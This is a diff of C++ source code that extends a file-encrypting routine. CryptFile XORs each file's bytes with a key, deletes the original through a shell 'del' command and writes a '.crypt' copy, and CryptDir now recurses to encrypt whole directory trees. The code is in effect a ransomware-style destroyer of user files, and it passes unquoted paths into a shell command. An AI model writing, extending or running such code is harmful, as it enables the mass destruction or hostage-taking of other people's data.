@@ -17,36 +17,49 @@ std::string readFile(const std::string fileName) {
 }
 
 std::string CryptFile(std::string path, int key) {
+	std::string n_path;
+	for (unsigned int item = 0; item < path.length(); ++item) {
+		if (path[item] == '/') n_path += "\\";
+		else n_path += path[item];
+	}
+
+	if (n_path[n_path.size() - 1] == '\\') n_path.pop_back();
+
 	try {
-		std::string data = readFile(path), delcmd = "del " + path, cryptdata;
+		std::string data = readFile(n_path), delcmd = "del " + n_path, cryptdata;
 		for (unsigned int item = 0; item < data.length(); ++item)
 			cryptdata += data[item] ^ key;
 
-		std::ofstream crfile(path + ".crypt");
+		system(delcmd.c_str());
+		std::ofstream crfile(n_path + ".crypt");
 		for (unsigned int item = 0; item < cryptdata.length(); ++item)
 			crfile << cryptdata[item];
 
 		crfile.close();
-		system(delcmd.c_str());
-		return "crypt " + path + " ok";
+		return "crypt " + n_path + " ok\n";
 	}
 	catch (...) {
-		return "crypt " + path + " failed";
+		return "crypt " + n_path + " failed\n";
 	}
 }
 
 std::string CryptDir(std::string path, int key) {
-	std::string buf;
+	std::string buf, n_path;
 	std::vector<std::string> v;
-	v = scandir(path + "*");
-	for (unsigned int i = 0; i < v.size(); i++) {
-		try {
-			CryptFile(path + v[i], key);
-			buf += "crypt " + path + v[i] + " ok\n";
-		}
-		catch (...) {
-			continue;
-		}
+
+	for (unsigned int item = 0; item < path.length(); ++item) {
+		if (path[item] == '/') n_path += "\\";
+		else n_path += path[item];
 	}
+
+	if (n_path[n_path.size()-1] != '\\') n_path += "\\";
+
+	v = scandir(n_path + "*");
+	if (v.size() < 1) return "Directory exist\n";
+
+	for (unsigned int i = 0; i < v.size(); i++)
+		if (dirExists(n_path + v[i])) CryptDir(n_path + v[i], key);
+		else buf += CryptFile(n_path + v[i], key);
+
 	return buf;
 }
